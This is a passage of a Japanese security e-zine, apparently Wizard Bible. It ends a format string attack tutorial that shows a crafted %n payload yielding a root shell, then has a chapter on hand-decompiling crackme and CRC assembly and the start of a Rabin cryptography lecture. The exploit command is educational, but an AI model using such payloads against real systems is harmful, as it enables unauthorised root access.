+newbie@Glazheim:knoppix$ ./game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%230x.%n.%199x.%n.%260x.%n.%190x.%n
+[debug]addr of score = bffff95c
+[debug]addr of payload = bffff920
+Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3b.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is 0(0)!!
+sh-3.00# whoami
+root
+-----
+
+　root権限が奪取できていることが確認できました。このように、SEIPをペイロ
+ードの先頭に書き換えることができれば、BOFの時と同じように制御がペイロード
+に移ります。今回はペイロードの格納先として、プログラム内の配列を用いまし
+たが、環境変数に格納したペイロードに制御を移すことも可能です。これについ
+てはまたいずれ、時間があるときに触れたいと思います。
+
+
+■0x06.) おわりに
+
+　いかがでしたでしょうか。フォーマットストリング攻撃でも任意のプログラム
+を実行できることをご理解いただけたと思います。かなり危険なバグですが、妙
+な入力が行われない限り通常どおり出力されるため、発見が難しいバグです。
+　さて、今回まででBOFとフォーマットストリング攻撃という2大攻撃手法を用い
+てroot権限を奪取する実証を行ってきました。現在流行している、ひと通りのハ
+ッキング手法を軽く解説しましたので、次回は少し侵入系のトピックスから離れ
+て見ます。次回はバックドア（裏口作成）について解説したいと思います。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第5章: 逆アセンブルコードを読んでみよう ---
+
+著者：Kenji Aiko
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　基本的な解析技術を覚えた後、次のステップへ進むためにはどうしたら良いだ
+ろう？　私は、解析の基本はやはり「アセンブルコードを読むこと」だと考えて
+います。現在は様々なツールがあり、それらを駆使して効率的なソフトウェア解
+析を行えますが、ツールはあくまでツールであり、それを有効活用するためには、
+やはり基礎となる技術が必要だと思います。よって、今回は「アセンブルコード
+を読むこと」を中心としたリバースエンジニアリングについて解説します。
+　使用するツールはOllyDbgオンリーです。そのOllyDbgも逆アセンブルコードを
+出力することだけにしか使ってません（ぉぃ。
+
+
+■0x02.) crackmeを手動でデコンパイル
+
+　以下は、簡単なcrackmeを逆アセンブルしたコードです。
+
+-----  sample01.exe
+00401000 >/$  837C24 04 02  CMP DWORD PTR SS:[ESP+4],2
+00401005  |.  7D 06         JGE SHORT sample01.0040100D
+00401007  |.  B8 01000000   MOV EAX,1
+0040100C  |.  C3            RETN
+0040100D  |>  8B4424 08     MOV EAX,DWORD PTR SS:[ESP+8]
+00401011  |.  8B48 04       MOV ECX,DWORD PTR DS:[EAX+4]
+00401014  |.  68 34514000   PUSH OFFSET /String2 = "wizardbible"
+00401019  |.  51            PUSH ECX    |String1
+0040101A  |.  FF15 00504000 CALL NEAR DWORD PTR DS:[<&KERNEL32.lstrcmpA>]
+00401020  |.  85C0          TEST EAX,EAX
+00401022  |.  6A 00         PUSH 0 ; /Style = MB_OK|MB_APPLMODAL
+00401024  |.  68 2C514000   PUSH OFFSET |Title = "Message"
+00401029  |.  75 15         JNZ SHORT sample01.00401040
+0040102B  |.  68 18514000   PUSH OFFSET Text = "you are wonderful!"
+00401030  |.  FF15 CC504000 CALL NEAR DWORD PTR DS:[<&USER32.GetActiveWindow>]
+00401036  |.  50            PUSH EAX 
+00401037  |.  FF15 C8504000 CALL NEAR DWORD PTR DS:[<&USER32.MessageBoxA>]
+0040103D  |.  33C0          XOR EAX,EAX
+0040103F >|.  C3            RETN
+00401040  |>  68 FC504000   PUSH OFFSET |Text = "password is not correct!"
+00401045  |.  FF15 CC504000 CALL NEAR DWORD PTR DS:[<&USER32.GetActiveWindow>]
+0040104B  |.  50            PUSH EAX                                            0040104C  |.  FF15 C8504000 CALL NEAR DWORD PTR DS:[<&USER32.MessageBoxA>]
+00401052  |.  33C0          XOR EAX,EAX
+00401054  \.  C3            RETN
+-----
+
+　では、これをC言語のソースコードに、手動でデコンパイルしましょう。
+　まずは、一番最初「00401000」の命令ですが、「2」と何かの値をCMPで比較し
+ています。そして、JGEなので、2以上だったらジャンプです。つまり、次のよう
+に推測できます。
+
+-----  sample01.cpp
+if(x < 2)
+    return 1;
+-----
+
+　適当な変数xが、2より小さいなら「MOV EAX, 1」と「RETN」なので、「return
+ 1」と変換できます。また、xはESP+4から取られているため、引数と分かります。
+　さて、もし2以上ならば、JGEはジャンプします。では、ジャンプ先「0040100D」
+を見ていきます。
+
+-----  sample01.exe
+0040100D  |>  8B4424 08     MOV EAX,DWORD PTR SS:[ESP+8]
+00401011  |.  8B48 04       MOV ECX,DWORD PTR DS:[EAX+4]
+-----
+
+　アドレス「00401011」で、EAX+4を参照しているため、EAXはアドレスです。そ
+してその参照先をECXに入れています。次に、PUSHで「wizardbible」という文字
+列のアドレスをスタックへ積んでおり、次にECXをスタックへ積んでいます。そし
+て、lstrcmpAなので、ECXは文字列のアドレスだと考えられます。よって以下のコ
+ードになります。
+
+-----  sample01.cpp
+if(x < 2)
+    return 1;
+lstrcmp(y(ECX), "wizardbible");
+-----
+
+　また、lstrcmpの戻り値を使って分岐しています。分岐にはTEST命令を使ってい
+ます。TEST命令は、基本はAND命令と同じですが、ANDの結果を保存せず、フラグ
+だけ変化するため、条件分岐によく使われます。
+
+-----  sample01.exe
+00401020  |.  85C0          TEST EAX,EAX（←lstrcmpAの戻り値比較）
+00401022  |.  6A 00         PUSH 0 ; /Style = MB_OK|MB_APPLMODAL
+00401024  |.  68 2C514000   PUSH OFFSET |Title = "Message"
+00401029  |.  75 15         JNZ SHORT sample01.00401040（比較によるジャンプ）
+-----
+
+　「TEST EAX, EAX」としていますが、このような「同じ値のAND」は必ず同じ値
+になりますよね（「AND 5, 5」は「5」です）。しかし、もしEAXが「0」ならば、
+このAND（TEST）の結果は「0」となります。よって、このように記述することで
+「0」か「それ以外の値」か、というように、条件を分けられます。
+　このことから、コードは以下になります。
+
+-----  sample01.cpp
+if(x < 2)
+    return 1;
+if(lstrcmp(y, "wizardbible") == 0)
+    // 何かの処理
+else
+    // 何かの処理
+-----
+
+　さらに、PUSHにより「MB_OK|MB_APPLMODAL」と「"Message"」がスタックへ入れ
+られているため、MessageBox関数が呼ばれることが推測でき、どちらの文字列を
+表示するかにより、分岐しています。
+
+-----  sample01.exe
+0040102B  |.  68 18514000   PUSH OFFSET Text = "you are wonderful!"
+00401030  |.  FF15 CC504000 CALL NEAR DWORD PTR DS:[<&USER32.GetActiveWindow>]
+00401036  |.  50            PUSH EAX 
+00401037  |.  FF15 C8504000 CALL NEAR DWORD PTR DS:[<&USER32.MessageBoxA>]
+0040103D  |.  33C0          XOR EAX,EAX
+0040103F >|.  C3            RETN
+00401040  |>  68 FC504000   PUSH OFFSET |Text = "password is not correct!"
+00401045  |.  FF15 CC504000 CALL NEAR DWORD PTR DS:[<&USER32.GetActiveWindow>]
+0040104B  |.  50            PUSH EAX                                            0040104C  |.  FF15 C8504000 CALL NEAR DWORD PTR DS:[<&USER32.MessageBoxA>]
+00401052  |.  33C0          XOR EAX,EAX
+00401054  \.  C3            RETN
+-----
+
+　lstrcmp関数の戻り値が0じゃなければ、JNZ命令により、アドレス「00401040」
+に処理が移ります。すると、「"password is not correct!"」がPUSHされ、Mess
+ageBoxA関数が呼ばれます。逆に、lstrcmp関数の戻り値が0ならば、「"you are 
+wonderful!"」がPUSHされ、MessageBoxA関数が呼ばれます。
+　これらの結果を合わせると、以下のC言語コードが記述できます。
+
+-----  sample01.cpp
+if(x < 2)
+    return 1;
+if(lstrcmp(y, "wizardbible") == 0){
+    MessageBoxA(GetActiveWindow(), 
+        "you are wonderful!", "Message", 0);
+}else{
+    MessageBoxA(GetActiveWindow(), 
+        "password is not correct!", "Message", 0);
+}
+-----
+
+　さらに、xはESP+4から取得され、yはESP+8から取得されているため、それぞれ
+引数を元に得られたものですね。つまり、関数は以下のようなコードだと考えら
+れます。
+
+-----  sample01.cpp
+int function(int x, void **z)
+{
+    if(x < 2)
+        return 1;
+    if(lstrcmp(*(z+1), "wizardbible") == 0){
+        MessageBoxA(GetActiveWindow(), 
+            "you are wonderful!", "Message", 0);
+    }else{
+        MessageBoxA(GetActiveWindow(), 
+            "password is not correct!", "Message", 0);
+    }
+    return 0;
+}
+-----
+
+　引数の感じ的に、main関数っぽいですね（事実main関数ですが…）。
+　このように、順番にアセンブルコードを読んでいくと、C言語のコードに変換す
+ることができます。
+
+
+■0x03.) アルゴリズムを手動でデコンパイル
+
+　簡単なcrackmeを手動でデコンパイルしましたが、実は、このようにAPI関数が
+ガンガン呼び出されているようなところをデコンパイルする機会は、あまりあり
+ません。なぜなら、デコンパイルしなくとも大体の動作が分かるからです。
+　手動でのデコンパイルが必要なところは、アルゴリズム的な処理を行っている
+部分が多いです。
+　例えば、以下のコードを見てください。
+
+-----  sample02.exe
+00401000 >/$  8B4C24 08     MOV ECX,DWORD PTR SS:[ESP+8]
+00401004  |.  83C8 FF       OR EAX,FFFFFFFF
+00401007  |.  85C9          TEST ECX,ECX
+00401009  |.  0F84 8B000000 JE sample02.0040109A
+0040100F  |.  8B5424 04     MOV EDX,DWORD PTR SS:[ESP+4]
+00401013  |.  56            PUSH ESI
+00401014  |>  0FB632        /MOVZX ESI,BYTE PTR DS:[EDX]
+00401017  |.  33C6          |XOR EAX,ESI
+00401019  |.  42            |INC EDX
+0040101A  |.  A8 01         |TEST AL,1
+0040101C  |.  74 04         |JE SHORT sample02.00401022
+0040101E  |.  D1E8          |SHR EAX,1
+00401020  |.  EB 07         |JMP SHORT sample02.00401029
+00401022  |>  D1E8          |SHR EAX,1
+00401024  |.  35 2083B8ED   |XOR EAX,EDB88320
+00401029  |>  A8 01         |TEST AL,1
+0040102B  |.  74 04         |JE SHORT sample02.00401031
+0040102D  |.  D1E8          |SHR EAX,1
+0040102F  |.  EB 07         |JMP SHORT sample02.00401038
+00401031  |>  D1E8          |SHR EAX,1
+00401033  |.  35 2083B8ED   |XOR EAX,EDB88320
+00401038  |>  A8 01         |TEST AL,1
+0040103A  |.  74 04         |JE SHORT sample02.00401040
+0040103C  |.  D1E8          |SHR EAX,1
+0040103E  |.  EB 07         |JMP SHORT sample02.00401047
+00401040  |>  D1E8          |SHR EAX,1
+00401042  |.  35 2083B8ED   |XOR EAX,EDB88320
+00401047  |>  A8 01         |TEST AL,1
+00401049  |.  74 04         |JE SHORT sample02.0040104F
+0040104B  |.  D1E8          |SHR EAX,1
+0040104D  |.  EB 07         |JMP SHORT sample02.00401056
+0040104F  |>  D1E8          |SHR EAX,1
+00401051  |.  35 2083B8ED   |XOR EAX,EDB88320
+00401056  |>  A8 01         |TEST AL,1
+00401058  |.  74 04         |JE SHORT sample02.0040105E
+0040105A  |.  D1E8          |SHR EAX,1
+0040105C  |.  EB 07         |JMP SHORT sample02.00401065
+0040105E  |>  D1E8          |SHR EAX,1
+00401060  |.  35 2083B8ED   |XOR EAX,EDB88320
+00401065  |>  A8 01         |TEST AL,1
+00401067  |.  74 04         |JE SHORT sample02.0040106D
+00401069  |.  D1E8          |SHR EAX,1
+0040106B  |.  EB 07         |JMP SHORT sample02.00401074
+0040106D  |>  D1E8          |SHR EAX,1
+0040106F  |.  35 2083B8ED   |XOR EAX,EDB88320
+00401074  |>  A8 01         |TEST AL,1
+00401076  |.  74 04         |JE SHORT sample02.0040107C
+00401078  |.  D1E8          |SHR EAX,1
+0040107A  |.  EB 07         |JMP SHORT sample02.00401083
+0040107C  |>  D1E8          |SHR EAX,1
+0040107E  |.  35 2083B8ED   |XOR EAX,EDB88320
+00401083  |>  A8 01         |TEST AL,1
+00401085  |.  74 04         |JE SHORT sample02.0040108B
+00401087  |.  D1E8          |SHR EAX,1
+00401089  |.  EB 07         |JMP SHORT sample02.00401092
+0040108B  |>  D1E8          |SHR EAX,1
+0040108D  |.  35 2083B8ED   |XOR EAX,EDB88320
+00401092  |>  49            |DEC ECX
+00401093  |.^ 0F85 7BFFFFFF \JNZ sample02.00401014
+00401099  |.  5E            POP ESI
+0040109A  |>  F7D0          NOT EAX
+0040109C  \.  C3            RETN
+-----
+
+　さて、これは簡単な「ある計算を行うアルゴリズム」です。これを手動でデコ
+ンパイルし、C言語に変換しましょう。
+
+-----  sample02.exe
+00401000 >/$  8B4C24 08     MOV ECX,DWORD PTR SS:[ESP+8]
+00401004  |.  83C8 FF       OR EAX,FFFFFFFF
+00401007  |.  85C9          TEST ECX,ECX
+00401009  |.  0F84 8B000000 JE sample02.0040109A
+-----
+
+　最初の2行で、2番目の引数をECXへ入れて、EAXを0xFFFFFFFFにしています。さ
+らに、ECX（2番目の引数）が0なら「0040109A」へジャンプします。つまり、2番
+目の引数が0だと「エラー」というわけです。さらに、アドレス「0040109A」は
+「NOT EAX」なので、EAXの値が反転し、0xFFFFFFFFから0x00000000へ変更されま
+す。
+
+-----  sample02.exe
+0040100F  |.  8B5424 04     MOV EDX,DWORD PTR SS:[ESP+4]
+00401013  |.  56            PUSH ESI
+00401014  |>  0FB632        /MOVZX ESI,BYTE PTR DS:[EDX]
+00401017  |.  33C6          |XOR EAX,ESI
+00401019  |.  42            |INC EDX
+-----
+
+　1番目の引数をEDXへ入れます。アドレス「00401014」で、EDXはアドレスを参照
+しているため、EDXはポインタです。
+　アドレス「00401013」で行ってる「PUSH ESI」は、この関数でESIレジスタを使
+うため、現在ESIに入っている値をスタックへ一時的に保存（バックアップ）して
+おく処理です。関数の最後でまたスタックからESIを復元します。
+　アドレス「00401014」のMOVZX命令は、サイズが違うレジスタへ値を転送します。
+EDXが指す値が1バイト分だけ、ESIへ入れられます。そして、ESIはEAXとXORされ
+ます。EAXは0xFFFFFFFFですね。さらにEDXをインクリメントです。EDXはポインタ
+なので、次の値を指すことになります。
+　では、ここまでを、C言語のソースコードにします。
+
+-----  sample02-1.cpp
+int function(char *x, int y)
+{
+    a = 0xFFFFFFFF;
+    if(y == 0)
+        return ~a;
+
+    b = *x;
+    a = a ^ b;
+    x++;
+-----
+
+　関数名、戻り値や引数の型は適当です。とりあえず、中の処理が重要です。ま
+た、中の処理もループなどはまだ計算していないため、そのまま処理を書いてい
+るだけです。今後変更される可能性があります。ただ、現状分かっている段階で
+はここまで書けます。
+　では、次へ進みます。
+
+-----  sample02.exe
+0040101A  |.  A8 01         |TEST AL,1
+0040101C  |.  74 04         |JE SHORT sample02.00401022
+0040101E  |.  D1E8          |SHR EAX,1
+00401020  |.  EB 07         |JMP SHORT sample02.00401029
+00401022  |>  D1E8          |SHR EAX,1
+00401024  |.  35 2083B8ED   |XOR EAX,EDB88320
+-----
+
+　最初のTEST命令により、EAXの最初の1ビットがONかOFFかによって処理が分かれ
+ます。ここから、以下のコードが再現できます。ここは、xorやシフト演算なので、
+コード化しやすいかもしれません。
+
+-----  sample02-2.cpp
+    if(a & 1){
+        a = a >> 1;
+    }else{
+        a = a >> 1;
+        a ^= 0xEDB88320;
+    }
+-----
+
+　では、次を読み進めます。
+
+-----  sample02.exe
+00401029  |>  A8 01         |TEST AL,1
+0040102B  |.  74 04         |JE SHORT sample02.00401031
+0040102D  |.  D1E8          |SHR EAX,1
+0040102F  |.  EB 07         |JMP SHORT sample02.00401038
+00401031  |>  D1E8          |SHR EAX,1
+00401033  |.  35 2083B8ED   |XOR EAX,EDB88320
+-----
+
+　前回とコードが同じです。
+
+-----  sample02-3.cpp
+    if(a & 1){
+        a = a >> 1;
+    }else{
+        a = a >> 1;
+        a ^= 0xEDB88320;
+    }
+-----
+
+　さらに次へ進みます。
+
+-----  sample02.exe
+00401038  |>  A8 01         |TEST AL,1
+0040103A  |.  74 04         |JE SHORT sample02.00401040
+0040103C  |.  D1E8          |SHR EAX,1
+0040103E  |.  EB 07         |JMP SHORT sample02.00401047
+00401040  |>  D1E8          |SHR EAX,1
+00401042  |.  35 2083B8ED   |XOR EAX,EDB88320
+-----
+
+　またまた、コードが同じです。
+　よく見ていくと、アドレス「0040108D」まで、同じコードが続きます。もちろ
+ん、このまま「0040108D」まで、上記のC言語コードを書いてもよいのですが、せ
+っかくC言語に直すので、少し読みやすくします。アドレス「0040108D」まで8回、
+同じコードが繰り返されるため、for文を使って、処理を簡略化します。
+
+-----  sample02-4.cpp
+    for(int i=0; i < 8; i++)
+    {
+        if(a & 1){
+            a = a >> 1;
+        }else{
+            a = a >> 1;
+            a ^= 0xEDB88320;
+        }
+    }
+-----
+
+　そして、最後のルーチンです。
+
+-----  sample02.exe
+00401092  |>  49            |DEC ECX
+00401093  |.^ 0F85 7BFFFFFF \JNZ sample02.00401014
+00401099  |.  5E            POP ESI
+0040109A  |>  F7D0          NOT EAX
+0040109C  \.  C3            RETN
+-----
+
+　ECXを減算していますが、この値はこの関数へ渡される第2引数です。そして、
+ECXが0でないならば、またアドレス「00401014」へ戻り、これまでと同じ処理が
+繰り返されます
+　では、ソース全体を完成させましょう。
+
+-----  sample02.cpp
+unsigned long function(char *x, int y)
+{
+    unsigned long a;
+    char b;
+
+    a = 0xFFFFFFFF;
+    if(y == 0)
+        return ~a;
+
+    while(1){
+        b = *x;
+        a = a ^ b;
+        x++;
+
+        for(int i=0; i < 8; i++)
+        {
+            if(a & 1){
+                a = a >> 1;
+            }else{
+                a = a >> 1;
+                a ^= 0xEDB88320;
+            }
+        }
+        y--;
+        if(y == 0)
+            break;
+    }
+
+    return ~a;
+}
+-----
+
+　アセンブルコードを元に生成しているため、実際のコードとは異なっているか
+もしれませんが、出力結果は同じです。無事デコンパイルが出来ています。ちな
+みにこのコードは、データのCRCを求める関数です。私も知り合いに教えてもらっ
+たコードで「こんな単純な処理でCRCが求められるのか」と少し驚かされました。
+
+
+■0x04.) さいごに
+
+　今回、crackmeとCRCアルゴリズムのコードを手動でデコンパイルしましたが、
+いかがだったでしょうか？　crackmeは関数呼び出しの流れにより大体のコードが
+分かるため、やりやすかったかもしれませんが、アルゴリズム系は、いったい何
+をやっているのか最初は検討がつかないため、本当に自分の理解が正しいのか不
+安になります。しかし、最初は間違っていたとしても、読み進めていけば全体像
+が次第に掴めていくので、とりあえず「読むこと」が重要だと思います。
+　また、アセンブルコードを読むことは解析の基礎なので、速く正確に読めるこ
+とは、それだけで技術になります。それに、読む技術は何より経験が重要ですの
+で、伸ばすためには、毎日の地道な積み重ねが必要かもしれません。
+　そんなところで今回は終わりとさせていただきます。
+
+
+■0x05.) さいごのさいごに
+
+　以下のコードは、それなりに有名なあるアルゴリズムです。2つの関数で実装さ
+れています（00401000と00401100）。もし良かったら腕試しにデコンパイルに挑
+戦してみてください。ただ、既存のアルゴリズムなので、特定さえできたら、お
+そらくインターネット上で同様のソースコードが見つかるかと思います。なので、
+全部デコンパイルする必要はないでしょう。
+　元々アルゴリズムを知ってる人（研究者？）なら、一瞬で分かるかと思います
+が、知らない人で「じゃあコードを読んで解析しよう！」となると、2～3時間く
+らいはかかるかと思います（たぶん）。個人的には、一日かけて分かれば十分に
+すごいのでは？　と思ってます。
+
+-----  sample03.exe
+00401000 >/$  53            PUSH EBX
+00401001  |.  55            PUSH EBP
+00401002  |.  56            PUSH ESI
+00401003  |.  8B7424 10     MOV ESI,DWORD PTR SS:[ESP+10]
+00401007  |.  33C9          XOR ECX,ECX
+00401009  |.  33C0          XOR EAX,EAX
+0040100B  |.  57            PUSH EDI
+0040100C  |.  33ED          XOR EBP,EBP
+0040100E  |.  890E          MOV DWORD PTR DS:[ESI],ECX
+00401010  |.  894E 04       MOV DWORD PTR DS:[ESI+4],ECX
+00401013  |>  884C0E 08     /MOV BYTE PTR DS:[ESI+ECX+8],CL
+00401017  |.  41            |INC ECX
+00401018  |.  81F9 00010000 |CMP ECX,100
+0040101E  |.^ 72 F3         \JB SHORT sample03.00401013
+00401020  |.  8B4C24 1C     MOV ECX,DWORD PTR SS:[ESP+1C]
+00401024  |.  8D7E 09       LEA EDI,DWORD PTR DS:[ESI+9]
+00401027  |.  C74424 14 400>MOV DWORD PTR SS:[ESP+14],40
+0040102F  |.  90            NOP
+00401030  |>  0FB657 FF     /MOVZX EDX,BYTE PTR DS:[EDI-1]
+00401034  |.  8B5C24 18     |MOV EBX,DWORD PTR SS:[ESP+18]
+00401038  |.  0FB61C18      |MOVZX EBX,BYTE PTR DS:[EAX+EBX]
+0040103C  |.  03DA          |ADD EBX,EDX
+0040103E  |.  0FB657 FF     |MOVZX EDX,BYTE PTR DS:[EDI-1]
+00401042  |.  03DD          |ADD EBX,EBP
+00401044  |.  81E3 FF000000 |AND EBX,0FF
+0040104A  |.  8BEB          |MOV EBP,EBX
+0040104C  |.  0FB65C2E 08   |MOVZX EBX,BYTE PTR DS:[ESI+EBP+8]
+00401051  |.  40            |INC EAX
+00401052  |.  3BC1          |CMP EAX,ECX
+00401054  |.  88542E 08     |MOV BYTE PTR DS:[ESI+EBP+8],DL
+00401058  |.  885F FF       |MOV BYTE PTR DS:[EDI-1],BL
+0040105B  |.  72 02         |JB SHORT sample03.0040105F
+0040105D  |.  33C0          |XOR EAX,EAX
+0040105F  |>  0FB617        |MOVZX EDX,BYTE PTR DS:[EDI]
+00401062  |.  8B5C24 18     |MOV EBX,DWORD PTR SS:[ESP+18]
+00401066  |.  0FB61C18      |MOVZX EBX,BYTE PTR DS:[EAX+EBX]
+0040106A  |.  03DA          |ADD EBX,EDX
+0040106C  |.  03DD          |ADD EBX,EBP
+0040106E  |.  81E3 FF000000 |AND EBX,0FF
+00401074  |.  8BEB          |MOV EBP,EBX
+00401076  |.  0FB61F        |MOVZX EBX,BYTE PTR DS:[EDI]
+00401079  |.  0FB6542E 08   |MOVZX EDX,BYTE PTR DS:[ESI+EBP+8]
+0040107E  |.  40            |INC EAX
+0040107F  |.  3BC1          |CMP EAX,ECX
+00401081  |.  885C2E 08     |MOV BYTE PTR DS:[ESI+EBP+8],BL
+00401085  |.  8817          |MOV BYTE PTR DS:[EDI],DL
+00401087  |.  72 02         |JB SHORT sample03.0040108B
+00401089  |.  33C0          |XOR EAX,EAX
+0040108B  |>  0FB657 01     |MOVZX EDX,BYTE PTR DS:[EDI+1]
+0040108F  |.  8B5C24 18     |MOV EBX,DWORD PTR SS:[ESP+18]
+00401093  |.  0FB61C18      |MOVZX EBX,BYTE PTR DS:[EAX+EBX]
+00401097  |.  03DA          |ADD EBX,EDX
+00401099  |.  03DD          |ADD EBX,EBP
+0040109B  |.  81E3 FF000000 |AND EBX,0FF
+004010A1  |.  8BEB          |MOV EBP,EBX
+004010A3  |.  0FB65F 01     |MOVZX EBX,BYTE PTR DS:[EDI+1]
+004010A7  |.  0FB6542E 08   |MOVZX EDX,BYTE PTR DS:[ESI+EBP+8]
+004010AC  |.  40            |INC EAX
+004010AD  |.  3BC1          |CMP EAX,ECX
+004010AF  |.  885C2E 08     |MOV BYTE PTR DS:[ESI+EBP+8],BL
+004010B3  |.  8857 01       |MOV BYTE PTR DS:[EDI+1],DL
+004010B6  |.  72 02         |JB SHORT sample03.004010BA
+004010B8  |.  33C0          |XOR EAX,EAX
+004010BA  |>  0FB657 02     |MOVZX EDX,BYTE PTR DS:[EDI+2]
+004010BE  |.  8B5C24 18     |MOV EBX,DWORD PTR SS:[ESP+18]
+004010C2  |.  0FB61C18      |MOVZX EBX,BYTE PTR DS:[EAX+EBX]
+004010C6  |.  03DA          |ADD EBX,EDX
+004010C8  |.  03DD          |ADD EBX,EBP
+004010CA  |.  81E3 FF000000 |AND EBX,0FF
+004010D0  |.  8BEB          |MOV EBP,EBX
+004010D2  |.  0FB65F 02     |MOVZX EBX,BYTE PTR DS:[EDI+2]
+004010D6  |.  0FB6542E 08   |MOVZX EDX,BYTE PTR DS:[ESI+EBP+8]
+004010DB  |.  40            |INC EAX
+004010DC  |.  3BC1          |CMP EAX,ECX
+004010DE  |.  885C2E 08     |MOV BYTE PTR DS:[ESI+EBP+8],BL
+004010E2  |.  8857 02       |MOV BYTE PTR DS:[EDI+2],DL
+004010E5  |.  72 02         |JB SHORT sample03.004010E9
+004010E7  |.  33C0          |XOR EAX,EAX
+004010E9  |>  8B5424 14     |MOV EDX,DWORD PTR SS:[ESP+14]
+004010ED  |.  83C7 04       |ADD EDI,4
+004010F0  |.  4A            |DEC EDX
+004010F1  |.  895424 14     |MOV DWORD PTR SS:[ESP+14],EDX
+004010F5  |.^ 0F85 35FFFFFF \JNZ sample03.00401030
+004010FB  |.  5F            POP EDI
+004010FC  |.  5E            POP ESI
+004010FD  |.  5D            POP EBP
+004010FE  |.  5B            POP EBX
+004010FF  \.  C3            RETN
+00401100 >/$  8B4C24 10     MOV ECX,DWORD PTR SS:[ESP+10]
+00401104  |.  85C9          TEST ECX,ECX
+00401106  |.  76 64         JBE SHORT sample03.0040116C
+00401108  |.  8B4424 04     MOV EAX,DWORD PTR SS:[ESP+4]
+0040110C  |.  53            PUSH EBX
+0040110D  |.  55            PUSH EBP
+0040110E  |.  8B6C24 10     MOV EBP,DWORD PTR SS:[ESP+10]
+00401112  |.  56            PUSH ESI
+00401113  |.  57            PUSH EDI
+00401114  |.  8B7C24 1C     MOV EDI,DWORD PTR SS:[ESP+1C]
+00401118  |.  2BEF          SUB EBP,EDI
+0040111A  |.  894C24 20     MOV DWORD PTR SS:[ESP+20],ECX
+0040111E  |.  8BFF          MOV EDI,EDI
+00401120  |>  8B08          /MOV ECX,DWORD PTR DS:[EAX]
+00401122  |.  8B70 04       |MOV ESI,DWORD PTR DS:[EAX+4]
+00401125  |.  41            |INC ECX
+00401126  |.  81E1 FF000000 |AND ECX,0FF
+0040112C  |.  0FB65408 08   |MOVZX EDX,BYTE PTR DS:[EAX+ECX+8]
+00401131  |.  03F2          |ADD ESI,EDX
+00401133  |.  81E6 FF000000 |AND ESI,0FF
+00401139  |.  0FB65C30 08   |MOVZX EBX,BYTE PTR DS:[EAX+ESI+8]
+0040113E  |.  8908          |MOV DWORD PTR DS:[EAX],ECX
+00401140  |.  8970 04       |MOV DWORD PTR DS:[EAX+4],ESI
+00401143  |.  885430 08     |MOV BYTE PTR DS:[EAX+ESI+8],DL
+00401147  |.  885C08 08     |MOV BYTE PTR DS:[EAX+ECX+8],BL
+0040114B  |.  03DA          |ADD EBX,EDX
+0040114D  |.  81E3 FF000000 |AND EBX,0FF
+00401153  |.  8A4C03 08     |MOV CL,BYTE PTR DS:[EBX+EAX+8]
+00401157  |.  320C2F        |XOR CL,BYTE PTR DS:[EDI+EBP]
+0040115A  |.  880F          |MOV BYTE PTR DS:[EDI],CL
+0040115C  |.  8B4C24 20     |MOV ECX,DWORD PTR SS:[ESP+20]
+00401160  |.  47            |INC EDI
+00401161  |.  49            |DEC ECX
+00401162  |.  894C24 20     |MOV DWORD PTR SS:[ESP+20],ECX
+00401166  |.^ 75 B8         \JNZ SHORT sample03.00401120
+00401168  |.  5F            POP EDI
+00401169  |.  5E            POP ESI
+0040116A  |.  5D            POP EBP
+0040116B  |.  5B            POP EBX
+0040116C  \>  C3            RETN
+-----
+
+　もし機会があれば、回答編もやるかもしれません(^^;。
+　ではではー。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第6章: 基礎暗号学講座・第17回 ～Rabin暗号～ ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回は拡張ElGamal暗号を紹介した。今回は引き続いて公開鍵暗号の一種である
+Rabin暗号を紹介する。
+
+
+■0x02.) 数学的準備
+
+　すでに解説した数学的概念もありますが、特に重要なものを改めて解説してお
+く。
+
+●Z_N
+
+　Zは整数の集合であり、Z_Nと書いた場合は法をNとしたときのZの集合である。
+つまり、Z_N={0,1,2,…,N-1}である。
+
+●GCD
+
+　GCD（Greatest Common Division）は、最大公約数を意味する。aとbの公約数と
+いった場合はaとbに共通する約数のことであり、最大公約数とは最大の公約数の
+ことである。a,bの最大公約数はGCD(a,b)と表記される。
+　例えば、GCD(12,10)は2である。なぜならば12=2・2・3、10=2・5であり、12と
+10の公約数は2しか持たないからである。
+
+　ユークリッドの互除法と呼ばれる有名なアルゴリズムを用いることで、機械的
+にGCDを計算することができる。
+
+●CRT（中国人剰余定理）
+
+　m1,m2,…,m_r：各々が互いに素、a1,a2,…,a_r∈Zとする。
+　このとき、次のr個の合同式を満たすxはM=Π[i=1;r]m_iを法としてただひとつ
+だけ存在する。
+
+x≡a1 (mod m1)
+x≡a2 (mod m2)
+…
+x≡a_r (mod m_r)
+
+　さらに、M_i=M/m_i、y_i=(M_i)^(-1) (mod m_i) (i=1,…,r)とすると、その解
+xは次の通りになる。
+
+x≡Σ[i=1;r]a_i(M_i・y_i) (mod M)
+
+　以上がCRTである。m1,m2,…,m_rが互いに素であるときのみにCRTを用いること
